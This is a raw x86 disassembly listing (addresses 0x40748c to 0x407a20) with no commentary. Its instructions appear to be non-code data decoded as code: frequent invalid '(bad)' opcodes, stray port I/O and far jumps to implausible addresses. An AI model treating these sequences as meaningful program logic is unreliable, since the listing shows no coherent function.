  40748c:	25 15 cd 55 f5       	and    $0xf555cd15,%eax
  407491:	a8 34                	test   $0x34,%al
  407493:	56                   	push   %esi
  407494:	94                   	xchg   %eax,%esp
  407495:	d5 63                	aad    $0x63
  407497:	ed                   	in     (%dx),%eax
  407498:	36 9c                	ss pushf
  40749a:	18 4d 4d             	sbb    %cl,0x4d(%ebp)
  40749d:	7c 1c                	jl     0x4074bb
  40749f:	9a a0 41 1d 7f bc 53 	lcall  $0x53bc,$0x7f1d41a0
  4074a6:	ca f8 3d             	lret   $0x3df8
  4074a9:	d7                   	xlat   %ds:(%ebx)
  4074aa:	04 55                	add    $0x55,%al
  4074ac:	8e a6 aa f6 0d 8e    	mov    -0x71f20956(%esi),%fs
  4074b2:	9a 16 b4 69 ad f1 f4 	lcall  $0xf4f1,$0xad69b416
  4074b9:	b8 6b 9b d4 05       	mov    $0x5d49b6b,%eax
  4074be:	46                   	inc    %esi
  4074bf:	35 cb b6 ba 3b       	xor    $0x3bbab6cb,%eax
  4074c4:	b6 97                	mov    $0x97,%dh
  4074c6:	d7                   	xlat   %ds:(%ebx)
  4074c7:	35 e9 52 13 a9       	xor    $0xa91352e9,%eax
  4074cc:	b7 57                	mov    $0x57,%bh
  4074ce:	e3 24                	jecxz  0x4074f4
  4074d0:	68 d2 25 38 51       	push   $0x513825d2
  4074d5:	17                   	pop    %ss
  4074d6:	73 8d                	jae    0x407465
  4074d8:	df 55 4d             	fists  0x4d(%ebp)
  4074db:	ed                   	in     (%dx),%eax
  4074dc:	8e 3a                	mov    (%edx),%?
  4074de:	9c                   	pushf
  4074df:	5f                   	pop    %edi
  4074e0:	d5 8d                	aad    $0x8d
  4074e2:	14 81                	adc    $0x81,%al
  4074e4:	b8 f9 65 14 5c       	mov    $0x5c1465f9,%eax
  4074e9:	c2 15 a0             	ret    $0xa015
  4074ec:	05 6f 4f 9d b2       	add    $0xb29d4f6f,%eax
  4074f1:	ae                   	scas   %es:(%edi),%al
  4074f2:	ba a6 46 ef ab       	mov    $0xabef46a6,%edx
  4074f7:	e9 05 95 f2 fa       	jmp    0xfb330a01
  4074fc:	32 3c a1             	xor    (%ecx,%eiz,4),%bh
  4074ff:	ae                   	scas   %es:(%edi),%al
  407500:	99                   	cltd
  407501:	5f                   	pop    %edi
  407502:	be 0e 6f 0d ec       	mov    $0xec0d6f0e,%esi
  407507:	39 68 ae             	cmp    %ebp,-0x52(%eax)
  40750a:	c6                   	(bad)
  40750b:	26 f8                	es clc
  40750d:	d2 ab ae 43 aa d9    	shrb   %cl,-0x2655bc52(%ebx)
  407513:	82 b7 0b ce 22 6c 4c 	xorb   $0x4c,0x6c22ce0b(%edi)
  40751a:	15 cb 6a aa f1       	adc    $0xf1aa6acb,%eax
  40751f:	34 5a                	xor    $0x5a,%al
  407521:	5c                   	pop    %esp
  407522:	9a b8 a1 8e 77 63 c5 	lcall  $0xc563,$0x778ea1b8
  407529:	9a fa fa e6 e0 ec c3 	lcall  $0xc3ec,$0xe0e6fafa
  407530:	39 d3                	cmp    %edx,%ebx
  407532:	d2 4c 9d 50          	rorb   %cl,0x50(%ebp,%ebx,4)
  407536:	bd 01 6a 1d 0d       	mov    $0xd1d6a01,%ebp
  40753b:	34 3b                	xor    $0x3b,%al
  40753d:	b4 fe                	mov    $0xfe,%ah
  40753f:	ac                   	lods   %ds:(%esi),%al
  407540:	c2 db 10             	ret    $0x10db
  407543:	97                   	xchg   %eax,%edi
  407544:	1e                   	push   %ds
  407545:	58                   	pop    %eax
  407546:	3f                   	aas
  407547:	e0 e9                	loopne 0x407532
  407549:	d8 5e b3             	fcomps -0x4d(%esi)
  40754c:	09 76 b8             	or     %esi,-0x48(%esi)
  40754f:	ba 07 dc ed ed       	mov    $0xededdc07,%edx
  407554:	d0 ec                	shr    $1,%ah
  407556:	76 41                	jbe    0x407599
  407558:	75 27                	jne    0x407581
  40755a:	a2 b5 1f a1 2e       	mov    %al,0x2ea11fb5
  40755f:	a1 d0 e9 ea 77       	mov    0x77eae9d0,%eax
  407564:	41                   	inc    %ecx
  407565:	83 ab 63 bb bb bf c6 	subl   $0xffffffc6,-0x4044449d(%ebx)
  40756c:	b3 19                	mov    $0x19,%bl
  40756e:	7a fc                	jp     0x40756c
  407570:	1d 5e 5f 37 1a       	sbb    $0x1a375f5e,%eax
  407575:	d5 7e                	aad    $0x7e
  407577:	97                   	xchg   %eax,%edi
  407578:	ab                   	stos   %eax,%es:(%edi)
  407579:	43                   	inc    %ebx
  40757a:	ce                   	into
  40757b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40757c:	32 6f 77             	xor    0x77(%edi),%ch
  40757f:	b7 ba                	mov    $0xba,%bh
  407581:	3a fb                	cmp    %bl,%bh
  407583:	f3 d6                	repz salc
  407585:	ba 7b dd 3e 4f       	mov    $0x4f3edd7b,%edx
  40758a:	07                   	pop    %es
  40758b:	d4 7a                	aam    $0x7a
  40758d:	3a 7c 5e bf          	cmp    -0x41(%esi,%ebx,2),%bh
  407591:	b7 ab                	mov    $0xab,%bh
  407593:	3f                   	aas
  407594:	6f                   	outsl  %ds:(%esi),(%dx)
  407595:	83 c7 3f             	add    $0x3f,%edi
  407598:	e0 ea                	loopne 0x407584
  40759a:	5e                   	pop    %esi
  40759b:	e3 f2                	jecxz  0x40758f
  40759d:	a3 da e0 f3 76       	mov    %eax,0x76f3e0da
  4075a2:	d0 63 83             	shlb   $1,-0x7d(%ebx)
  4075a5:	86 ab ba 13 fa 50    	xchg   %ch,0x50fa13ba(%ebx)
  4075ab:	c0 c3 66             	rol    $0x66,%bl
  4075ae:	97                   	xchg   %eax,%edi
  4075af:	df cd                	(bad)
  4075b1:	3d fc e1 05 bc       	cmp    $0xbc05e1fc,%eax
  4075b6:	9a db ef 47 cf 3f c1 	lcall  $0xc13f,$0xcf47efdb
  4075bd:	e3 65                	jecxz  0x407624
  4075bf:	7d 13                	jge    0x4075d4
  4075c1:	ca 34 6f             	lret   $0x6f34
  4075c4:	ad                   	lods   %ds:(%esi),%eax
  4075c5:	bb 5f 54 5c b3       	mov    $0xb35c545f,%ebx
  4075ca:	5b                   	pop    %ebx
  4075cb:	56                   	push   %esi
  4075cc:	75 ed                	jne    0x4075bb
  4075ce:	ee                   	out    %al,(%dx)
  4075cf:	c6                   	(bad)
  4075d0:	65 44                	gs inc %esp
  4075d2:	ad                   	lods   %ds:(%esi),%eax
  4075d3:	28 6c 47 a7          	sub    %ch,-0x59(%edi,%eax,2)
  4075d7:	5a                   	pop    %edx
  4075d8:	e6 1f                	out    %al,$0x1f
  4075da:	f0 f7 b9 7b 3b dd 6a 	lock idivl 0x6add3b7b(%ecx)
  4075e1:	a9 e6 35 b9 11       	test   $0x11b935e6,%eax
  4075e6:	8d 9e 6d bd 9d 2e    	lea    0x2e9dbd6d(%esi),%ebx
  4075ec:	77 77                	ja     0x407665
  4075ee:	ad                   	lods   %ds:(%esi),%eax
  4075ef:	ab                   	stos   %eax,%es:(%edi)
  4075f0:	d7                   	xlat   %ds:(%ebx)
  4075f1:	b5 c5                	mov    $0xc5,%ch
  4075f3:	ad                   	lods   %ds:(%esi),%eax
  4075f4:	9e                   	sahf
  4075f5:	b0 dd                	mov    $0xdd,%al
  4075f7:	83 49 aa b5          	orl    $0xffffffb5,-0x56(%ecx)
  4075fb:	85 c9                	test   %ecx,%ecx
  4075fd:	55                   	push   %ebp
  4075fe:	8f                   	(bad)
  4075ff:	bf d1 dd eb ea       	mov    $0xeaebddd1,%edi
  407604:	11 05 9a c7 cb 7c    	adc    %eax,0x7ccbc79a
  40760a:	6e                   	outsb  %ds:(%esi),(%dx)
  40760b:	ff 80 2c 09 da 9e    	incl   -0x6125f6d4(%eax)
  407611:	13 dc                	adc    %esp,%ebx
  407613:	65 de 9e 3e f4 fd c2 	ficomps %gs:-0x3d020bc2(%esi)
  40761a:	6d                   	insl   (%dx),%es:(%edi)
  40761b:	ef                   	out    %eax,(%dx)
  40761c:	98                   	cwtl
  40761d:	e8 97 bb 7f 20       	call   0x20c031b9
  407622:	b4 77                	mov    $0x77,%ah
  407624:	ea 15 de 72 87 fa 38 	ljmp   $0x38fa,$0x8772de15
  40762b:	14 6d                	adc    $0x6d,%al
  40762d:	6b 1e 2f             	imul   $0x2f,(%esi),%ebx
  407630:	eb 74                	jmp    0x4076a6
  407632:	77 bb                	ja     0x4075ef
  407634:	65 89 b4 eb dc 3b d7 	mov    %esi,%gs:0xed73bdc(%ebx,%ebp,8)
  40763b:	0e 
  40763c:	78 3a                	js     0x407678
  40763e:	61                   	popa
  40763f:	c5 a4 c7 ee aa ed ed 	lds    -0x12125512(%edi,%eax,8),%esp
  407646:	ed                   	in     (%dx),%eax
  407647:	6b 70 78 71          	imul   $0x71,0x78(%eax),%esi
  40764b:	a9 ad f4 b8 bb       	test   $0xbbb8f4ad,%eax
  407650:	b1 ca                	mov    $0xca,%cl
  407652:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407653:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407654:	ed                   	in     (%dx),%eax
  407655:	e4 2a                	in     $0x2a,%al
  407657:	fc                   	cld
  407658:	51                   	push   %ecx
  407659:	38 59 c5             	cmp    %bl,-0x3b(%ecx)
  40765c:	95                   	xchg   %eax,%ebp
  40765d:	75 b2                	jne    0x407611
  40765f:	a8 de                	test   $0xde,%al
  407661:	86 93 f5 e0 98 4e    	xchg   %dl,0x4e98e0f5(%ebx)
  407667:	2e ea fb 0f 45 ea 20 	cs ljmp $0x4e20,$0xea450ffb
  40766e:	4e 
  40766f:	2e 08 8e df e4 22 75 	or     %cl,%cs:0x7522e4df(%esi)
  407676:	b0 26                	mov    $0x26,%al
  407678:	eb c1                	jmp    0x40763b
  40767a:	b1 9a                	mov    $0x9a,%cl
  40767c:	5c                   	pop    %esp
  40767d:	24 06                	and    $0x6,%al
  40767f:	6b 72 41 b0          	imul   $0xffffffb0,0x41(%edx),%esi
  407683:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407684:	27                   	daa
  407685:	17                   	pop    %ss
  407686:	89 ae 9e e2 3a bd    	mov    %ebp,-0x42c51d62(%esi)
  40768c:	db d4                	fcmovnbe %st(4),%st
  40768e:	be ac 75 f7 6f       	mov    $0x6ff775ac,%esi
  407693:	f5                   	cmc
  407694:	4e                   	dec    %esi
  407695:	51                   	push   %ecx
  407696:	a1 c1 e7 d9 e1       	mov    0xe1d9e7c1,%eax
  40769b:	e9 76 6f 71 4f       	jmp    0x4fb1e616
  4076a0:	11 bb 7b 77 53 bf    	adc    %edi,-0x40ac8885(%ebx)
  4076a6:	cf                   	iret
  4076a7:	bb 7d 8a 22 d1       	mov    $0xd1228a7d,%ebx
  4076ac:	4b                   	dec    %ebx
  4076ad:	1b 3d bd 9d de 9d    	sbb    0x9dde9dbd,%edi
  4076b3:	55                   	push   %ebp
  4076b4:	ae                   	scas   %es:(%edi),%al
  4076b5:	de ce                	fmulp  %st,%st(6)
  4076b7:	ee                   	out    %al,(%dx)
  4076b8:	29 2a                	sub    %ebp,(%edx)
  4076ba:	75 79                	jne    0x407735
  4076bc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4076bd:	52                   	push   %edx
  4076be:	27                   	daa
  4076bf:	9c                   	pushf
  4076c0:	da ec                	(bad)
  4076c2:	e9 9f aa 4e 7d       	jmp    0x7d8f2166
  4076c7:	53                   	push   %ebx
  4076c8:	1d f6 cd 64 dd       	sbb    $0xdd64cdf6,%eax
  4076cd:	db dd                	fcmovnu %st(5),%st
  4076cf:	39 75 01             	cmp    %esi,0x1(%ebp)
  4076d2:	bf d4 d4 25 8d       	mov    $0x8d25d4d4,%edi
  4076d7:	ee                   	out    %al,(%dx)
  4076d8:	2d 98 fd d4 65       	sub    $0x65d4fd98,%eax
  4076dd:	62 1a                	bound  %ebx,(%edx)
  4076df:	4c                   	dec    %esp
  4076e0:	5d                   	pop    %ebp
  4076e1:	d8 f7                	fdiv   %st(7),%st
  4076e3:	9f                   	lahf
  4076e4:	0a 7b dd             	or     -0x23(%ebx),%bh
  4076e7:	3b 7f a4             	cmp    -0x5c(%edi),%edi
  4076ea:	60                   	pusha
  4076eb:	4a                   	dec    %edx
  4076ec:	b5 c5                	mov    $0xc5,%ch
  4076ee:	ef                   	out    %eax,(%dx)
  4076ef:	f6 4d 5d 82          	testb  $0x82,0x5d(%ebp)
  4076f3:	7d dc                	jge    0x4076d1
  4076f5:	ed                   	in     (%dx),%eax
  4076f6:	dd 52 df             	fstl   -0x21(%edx)
  4076f9:	d5 d5                	aad    $0xd5
  4076fb:	ed                   	in     (%dx),%eax
  4076fc:	e9 9d 2a 08 5a       	jmp    0x5a48a19e
  407701:	fb                   	sti
  407702:	9a 77 f7 4d 51 d6 e9 	lcall  $0xe9d6,$0x514df777
  407709:	f6 6f ef             	imulb  -0x11(%edi)
  40770c:	f7 f6                	div    %esi
  40770e:	35 e0 16 79 c0       	xor    $0xc07916e0,%eax
  407713:	37                   	aaa
  407714:	45                   	inc    %ebp
  407715:	79 87                	jns    0x40769e
  407717:	8b ef                	mov    %edi,%ebp
  407719:	b7 cb                	mov    $0xcb,%bh
  40771b:	5c                   	pop    %esp
  40771c:	7d 53                	jge    0x407771
  40771e:	17                   	pop    %ss
  40771f:	37                   	aaa
  407720:	f5                   	cmc
  407721:	bb fa 7f 64 d0       	mov    $0xd0647ffa,%ebx
  407726:	f1                   	int1
  407727:	ae                   	scas   %es:(%edi),%al
  407728:	ff b1 8e ac ec 76    	push   0x76ecac8e(%ecx)
  40772e:	6d                   	insl   (%dx),%es:(%edi)
  40772f:	99                   	cltd
  407730:	72 5c                	jb     0x40778e
  407732:	1a 5c fd 5b          	sbb    0x5b(%ebp,%edi,8),%bl
  407736:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407737:	1e                   	push   %ds
  407738:	97                   	xchg   %eax,%edi
  407739:	1f                   	pop    %ds
  40773a:	2f                   	das
  40773b:	f1                   	int1
  40773c:	4f                   	dec    %edi
  40773d:	5d                   	pop    %ebp
  40773e:	84 9d 3b 75 41 df    	test   %bl,-0x20be8ac5(%ebp)
  407744:	94                   	xchg   %eax,%esp
  407745:	ea 4e 4f e7 54 b2 ab 	ljmp   $0xabb2,$0x54e74f4e
  40774c:	7b 8b                	jnp    0x4076d9
  40774e:	d7                   	xlat   %ds:(%ebx)
  40774f:	e7 e9                	out    %eax,$0xe9
  407751:	df da                	(bad)
  407753:	33 45 3b             	xor    0x3b(%ebp),%eax
  407756:	dd 03                	fldl   (%ebx)
  407758:	5b                   	pop    %ebx
  407759:	3c bd                	cmp    $0xbd,%al
  40775b:	3f                   	aas
  40775c:	7e ef                	jle    0x40774d
  40775e:	e3 8d                	jecxz  0x4076ed
  407760:	36 b9 70 ab cb d7    	ss mov $0xd7cbab70,%ecx
  407766:	b9 d3 e5 73 57       	mov    $0x5773e5d3,%ecx
  40776b:	f7 76 79             	divl   0x79(%esi)
  40776e:	7d 3d                	jge    0x4077ad
  407770:	2e 7e 4f             	jle,pn 0x4077c2
  407773:	4d                   	dec    %ebp
  407774:	ae                   	scas   %es:(%edi),%al
  407775:	44                   	inc    %esp
  407776:	4f                   	dec    %edi
  407777:	92                   	xchg   %eax,%edx
  407778:	be a9 6e 77 9e       	mov    $0x9e776ea9,%esi
  40777d:	91                   	xchg   %eax,%ecx
  40777e:	a3 12 3b ca ed       	mov    %eax,0xedca3b12
  407783:	9b                   	fwait
  407784:	22 05 57 77 77 9f    	and    0x9f777757,%al
  40778a:	ab                   	stos   %eax,%es:(%edi)
  40778b:	6f                   	outsl  %ds:(%esi),(%dx)
  40778c:	aa                   	stos   %al,%es:(%edi)
  40778d:	22 75 14             	and    0x14(%ebp),%dh
  407790:	fd                   	std
  407791:	3f                   	aas
  407792:	1a ac 7b 8a 22 ea 5b 	sbb    0x5bea228a(%ebx,%edi,2),%ch
  407799:	47                   	inc    %edi
  40779a:	6f                   	outsl  %ds:(%esi),(%dx)
  40779b:	67 b9 c7 37 45 a9    	addr16 mov $0xa94537c7,%ecx
  4077a1:	7f a0                	jg     0x407743
  4077a3:	83 9f 38 d5 08 f7 78 	sbbl   $0x78,-0x8f72ac8(%edi)
  4077aa:	fb                   	sti
  4077ab:	dd f8                	(bad)
  4077ad:	88 f2                	mov    %dh,%dl
  4077af:	4d                   	dec    %ebp
  4077b0:	59                   	pop    %ecx
  4077b1:	5c                   	pop    %esp
  4077b2:	e3 ed                	jecxz  0x4077a1
  4077b4:	70 75                	jo     0x40782b
  4077b6:	ff 68 a9             	ljmp   *-0x57(%eax)
  4077b9:	7f ab                	jg     0x407766
  4077bb:	d7                   	xlat   %ds:(%ebx)
  4077bc:	d7                   	xlat   %ds:(%ebx)
  4077bd:	5f                   	pop    %edi
  4077be:	36 d0 3f             	sarb   $1,%ss:(%edi)
  4077c1:	45                   	inc    %ebp
  4077c2:	11 3e                	adc    %edi,(%esi)
  4077c4:	c5 dd ea 43 9c       	vpminsw -0x64(%ebx),%ymm4,%ymm0
  4077c9:	cf                   	iret
  4077ca:	b9 81 a9 4e fe       	mov    $0xfe4ea981,%ecx
  4077cf:	11 5d ed             	adc    %ebx,-0x13(%ebp)
  4077d2:	e9 29 3a 65 c0       	jmp    0xc0a5b200
  4077d7:	e7 73                	out    %eax,$0x73
  4077d9:	f7 f6                	div    %esi
  4077db:	ab                   	stos   %eax,%es:(%edi)
  4077dc:	8d 4e 31             	lea    0x31(%esi),%ecx
  4077df:	54                   	push   %esp
  4077e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4077e1:	cf                   	iret
  4077e2:	96                   	xchg   %eax,%esi
  4077e3:	ad                   	lods   %ds:(%esi),%eax
  4077e4:	53                   	push   %ebx
  4077e5:	e8 d5 fe e2 45       	call   0x462376bf
  4077ea:	6b 3c 53 14          	imul   $0x14,(%ebx,%edx,2),%edi
  4077ee:	78 7e                	js     0x40786e
  4077f0:	ac                   	lods   %ds:(%esi),%al
  4077f1:	a0 47 7d 04 57       	mov    0x57047d47,%al
  4077f6:	f4                   	hlt
  4077f7:	f6 fb                	idiv   %bl
  4077f9:	76 37                	jbe    0x407832
  4077fb:	78 3d                	js     0x40783a
  4077fd:	bd 53 54 51 7b       	mov    $0x7b515453,%ebp
  407802:	ad                   	lods   %ds:(%esi),%eax
  407803:	01 b3 ff 91 2e 9b    	add    %esi,-0x64d16e01(%ebx)
  407809:	ba a8 6f 6a 15       	mov    $0x156a6fa8,%edx
  40780e:	df a9 77 7a 7d 9d    	fildll -0x62828589(%ecx)
  407814:	7e fe                	jle    0x407814
  407816:	82 3c 45 4f 7a fc db 	cmpb   $0x7f,-0x240385b1(,%eax,2)
  40781d:	7f 
  40781e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40781f:	68 2b aa 5e df       	push   $0xdf5eaa2b
  407824:	ee                   	out    %al,(%dx)
  407825:	1f                   	pop    %ds
  407826:	29 f4                	sub    %esi,%esp
  407828:	4e                   	dec    %esi
  407829:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40782a:	ba 77 4d 21 fa       	mov    $0xfa214d77,%edx
  40782f:	bc 3b ab f1 51       	mov    $0x51f1ab3b,%esp
  407834:	b6 6b                	mov    $0x6b,%dh
  407836:	aa                   	stos   %al,%es:(%edi)
  407837:	47                   	inc    %edi
  407838:	c9                   	leave
  407839:	94                   	xchg   %eax,%esp
  40783a:	32 2e                	xor    (%esi),%ch
  40783c:	18 93 c5 e3 71 cf    	sbb    %dl,-0x308e1c3b(%ebx)
  407842:	e5 e9                	in     $0xe9,%eax
  407844:	9f                   	lahf
  407845:	5c                   	pop    %esp
  407846:	e0 e8                	loopne 0x407830
  407848:	e3 0f                	jecxz  0x407859
  40784a:	4a                   	dec    %edx
  40784b:	75 ef                	jne    0x40783c
  40784d:	32 f1                	xor    %cl,%dh
  40784f:	c9                   	leave
  407850:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407851:	ee                   	out    %al,(%dx)
  407852:	60                   	pusha
  407853:	7e a0                	jle    0x4077f5
  407855:	35 77 f4 89 35       	xor    $0x3589f477,%eax
  40785a:	ba 11 37 21 be       	mov    $0xbe213711,%edx
  40785f:	4e                   	dec    %esi
  407860:	68 e9 fc 81 e0       	push   $0xe081fce9
  407865:	f7 0e f8 3a dc 50    	testl  $0x50dc3af8,(%esi)
  40786b:	ee                   	out    %al,(%dx)
  40786c:	f6 57 74             	notb   0x74(%edi)
  40786f:	ba a9 0d 7c e3       	mov    $0xe37c0da9,%edx
  407874:	76 43                	jbe    0x4078b9
  407876:	99                   	cltd
  407877:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407878:	6f                   	outsl  %ds:(%esi),(%dx)
  407879:	ab                   	stos   %eax,%es:(%edi)
  40787a:	db 47 26             	fildl  0x26(%edi)
  40787d:	bf 56 4b af a7       	mov    $0xa7af4b56,%edi
  407882:	83 db 6b             	sbb    $0x6b,%ebx
  407885:	76 f7                	jbe    0x40787e
  407887:	bb fd cd de ea       	mov    $0xeadecdfd,%ebx
  40788c:	1e                   	push   %ds
  40788d:	1c 54                	sbb    $0x54,%al
  40788f:	b1 d5                	mov    $0xd5,%cl
  407891:	13 4f 3f             	adc    0x3f(%edi),%ecx
  407894:	75 93                	jne    0x407829
  407896:	25 1f 78 ea 3e       	and    $0x3eea781f,%eax
  40789b:	2b e8                	sub    %eax,%ebp
  40789d:	69 1f 5d 40 35 ff    	imul   $0xff35405d,(%edi),%ebx
  4078a3:	f4                   	hlt
  4078a4:	c3                   	ret
  4078a5:	eb 27                	jmp    0x4078ce
  4078a7:	5b                   	pop    %ebx
  4078a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4078a9:	8b 3c dc             	mov    (%esp,%ebx,8),%edi
  4078ac:	a1 b7 75 7a 10       	mov    0x107a75b7,%eax
  4078b1:	ea f7 89 fa 07 a4 7e 	ljmp   $0x7ea4,$0x7fa89f7
  4078b8:	c7 38 41 df da       	xbegin 0xdb1fb9f5,(bad)
  4078bd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4078be:	1e                   	push   %ds
  4078bf:	cb                   	lret
  4078c0:	e9 21 5e 89 f1       	jmp    0xf1c9d6e6
  4078c5:	40                   	inc    %eax
  4078c6:	ad                   	lods   %ds:(%esi),%eax
  4078c7:	77 87                	ja     0x407850
  4078c9:	6a f0                	push   $0xfffffff0
  4078cb:	b6 f8                	mov    $0xf8,%dh
  4078cd:	ed                   	in     (%dx),%eax
  4078ce:	4c                   	dec    %esp
  4078cf:	27                   	daa
  4078d0:	93                   	xchg   %eax,%ebx
  4078d1:	51                   	push   %ecx
  4078d2:	ed                   	in     (%dx),%eax
  4078d3:	af                   	scas   %es:(%edi),%eax
  4078d4:	ee                   	out    %al,(%dx)
  4078d5:	6d                   	insl   (%dx),%es:(%edi)
  4078d6:	f4                   	hlt
  4078d7:	a2 a1 b6 e1 5f       	mov    %al,0x5fe1b6a1
  4078dc:	33 e0                	xor    %eax,%esp
  4078de:	e9 ee 17 d2 a4       	jmp    0xa51290d1
  4078e3:	2b d3                	sub    %ebx,%edx
  4078e5:	f3 75 f2             	repz jne 0x4078da
  4078e8:	85 55 99             	test   %edx,-0x67(%ebp)
  4078eb:	d7                   	xlat   %ds:(%ebx)
  4078ec:	56                   	push   %esi
  4078ed:	9f                   	lahf
  4078ee:	b4 64                	mov    $0x64,%ah
  4078f0:	06                   	push   %es
  4078f1:	0d f1 94 a5 d3       	or     $0xd3a594f1,%eax
  4078f6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4078f7:	dd dd                	fstp   %st(5)
  4078f9:	57                   	push   %edi
  4078fa:	b1 0b                	mov    $0xb,%cl
  4078fc:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4078fd:	16                   	push   %ss
  4078fe:	0d a4 fa a8 45       	or     $0x45a8faa4,%eax
  407903:	49                   	dec    %ecx
  407904:	67 e2 1e             	loopw  0x407925
  407907:	2f                   	das
  407908:	e8 c9 98 83 8d       	call   0x8dc411d6
  40790d:	74 e9                	je     0x4078f8
  40790f:	4b                   	dec    %ebx
  407910:	6a 71                	push   $0x71
  407912:	67 8f                	addr16 (bad)
  407914:	cf                   	iret
  407915:	ba a0 5f d1 bb       	mov    $0xbbd15fa0,%edx
  40791a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40791b:	db e3                	fninit
  40791d:	df 1a                	fistps (%edx)
  40791f:	f4                   	hlt
  407920:	eb 9b                	jmp    0x4078bd
  407922:	2a 07                	sub    (%edi),%al
  407924:	ba bb 83 ae f6       	mov    $0xf6ae83bb,%edx
  407929:	fc                   	cld
  40792a:	56                   	push   %esi
  40792b:	47                   	inc    %edi
  40792c:	12 9f a4 41 47 f7    	adc    -0x8b8be5c(%edi),%bl
  407932:	fc                   	cld
  407933:	d6                   	salc
  407934:	6f                   	outsl  %ds:(%esi),(%dx)
  407935:	d5 83                	aad    $0x83
  407937:	e5 7d                	in     $0x7d,%eax
  407939:	3f                   	aas
  40793a:	28 ef                	sub    %ch,%bh
  40793c:	fb                   	sti
  40793d:	41                   	inc    %ecx
  40793e:	b9 78 8a 53 99       	mov    $0x99538a78,%ecx
  407943:	b4 49                	mov    $0x49,%ah
  407945:	0f 8a fa cb 92 c3    	jp     0xc3d34545
  40794b:	27                   	daa
  40794c:	5a                   	pop    %edx
  40794d:	2f                   	das
  40794e:	3e 3c 82             	ds cmp $0x82,%al
  407951:	13 46 7b             	adc    0x7b(%esi),%eax
  407954:	7a cb                	jp     0x407921
  407956:	49                   	dec    %ecx
  407957:	a3 53 1a 82 8f       	mov    %eax,0x8f821a53
  40795c:	6f                   	outsl  %ds:(%esi),(%dx)
  40795d:	f1                   	int1
  40795e:	46                   	inc    %esi
  40795f:	10 74 83 ef          	adc    %dh,-0x11(%ebx,%eax,4)
  407963:	2e 3e b7 d8          	cs ds mov $0xd8,%bh
  407967:	37                   	aaa
  407968:	eb 1f                	jmp    0x407989
  40796a:	e6 62                	out    %al,$0x62
  40796c:	fb                   	sti
  40796d:	3c 41                	cmp    $0x41,%al
  40796f:	a2 9d b7 fe 91       	mov    %al,0x91feb79d
  407974:	ae                   	scas   %es:(%edi),%al
  407975:	ee                   	out    %al,(%dx)
  407976:	be 27 28 ea e4       	mov    $0xe4ea2827,%esi
  40797b:	e4 d7                	in     $0xd7,%al
  40797d:	f5                   	cmc
  40797e:	f9                   	stc
  40797f:	d5 33                	aad    $0x33
  407981:	e8 29 4f 35 55       	call   0x5575c8af
  407986:	ab                   	stos   %eax,%es:(%edi)
  407987:	d6                   	salc
  407988:	b3 19                	mov    $0x19,%bl
  40798a:	6f                   	outsl  %ds:(%esi),(%dx)
  40798b:	2a a1 12 bb 5c fe    	sub    -0x1a344ee(%ecx),%ah
  407991:	fe                   	(bad)
  407992:	f6 9d f8 a4 c4 bb    	negb   -0x443b5b08(%ebp)
  407998:	06                   	push   %es
  407999:	27                   	daa
  40799a:	34 0e                	xor    $0xe,%al
  40799c:	95                   	xchg   %eax,%ebp
  40799d:	8f                   	(bad)
  40799e:	de a2 b0 ac d3 d1    	fisubs -0x2e2c5350(%edx)
  4079a4:	df ef                	fucomip %st(7),%st
  4079a6:	f3 6c                	rep insb (%dx),%es:(%edi)
  4079a8:	1e                   	push   %ds
  4079a9:	c0 22 be             	shlb   $0xbe,(%edx)
  4079ac:	81 d7 bc 72 f7 e6    	adc    $0xe6f772bc,%edi
  4079b2:	81 2d 5b f8 4d a0 69 	subl   $0xbe327869,0xa04df85b
  4079b9:	78 32 be 
  4079bc:	6b 79 26 68          	imul   $0x68,0x26(%ecx),%edi
  4079c0:	0e                   	push   %cs
  4079c1:	7c 3e                	jl     0x407a01
  4079c3:	f5                   	cmc
  4079c4:	6c                   	insb   (%dx),%es:(%edi)
  4079c5:	ee                   	out    %al,(%dx)
  4079c6:	de 4d f3             	fimuls -0xd(%ebp)
  4079c9:	6d                   	insl   (%dx),%es:(%edi)
  4079ca:	0a d9                	or     %cl,%bl
  4079cc:	e7 ea                	out    %eax,$0xea
  4079ce:	74 f7                	je     0x4079c7
  4079d0:	b8 7c db b5 a2       	mov    $0xa2b5db7c,%eax
  4079d5:	66 97                	xchg   %ax,%di
  4079d7:	0f c3 ae f4 61 5a b8 	movnti %ebp,-0x47a59e0c(%esi)
  4079de:	0e                   	push   %cs
  4079df:	ea 0a 2a 76 f5 bb 7b 	ljmp   $0x7bbb,$0xf5762a0a
  4079e6:	fd                   	std
  4079e7:	38 15 26 37 c3 27    	cmp    %dl,0x27c33726
  4079ed:	de 06                	fiadds (%esi)
  4079ef:	b7 6f                	mov    $0x6f,%bh
  4079f1:	ea 42 7c 9b e8 f2 6c 	ljmp   $0x6cf2,$0xe89b7c42
  4079f8:	19 f0                	sbb    %esi,%eax
  4079fa:	d1 03                	roll   $1,(%ebx)
  4079fc:	7b 72                	jnp    0x407a70
  4079fe:	31 8e 67 87 cf d3    	xor    %ecx,-0x2c307899(%esi)
  407a04:	37                   	aaa
  407a05:	b1 50                	mov    $0x50,%cl
  407a07:	ed                   	in     (%dx),%eax
  407a08:	07                   	pop    %es
  407a09:	3a a3 d1 dd ed da    	cmp    -0x2512222f(%ebx),%ah
  407a0f:	45                   	inc    %ebp
  407a10:	96                   	xchg   %eax,%esi
  407a11:	7f f2                	jg     0x407a05
  407a13:	c9                   	leave
  407a14:	38 df                	cmp    %bl,%bh
  407a16:	3a 07                	cmp    (%edi),%al
  407a18:	3a fa                	cmp    %dl,%bh
  407a1a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407a1b:	ba 68 df 6e 1f       	mov    $0x1f6edf68,%edx
  407a20:	7f 06                	jg     0x407a28
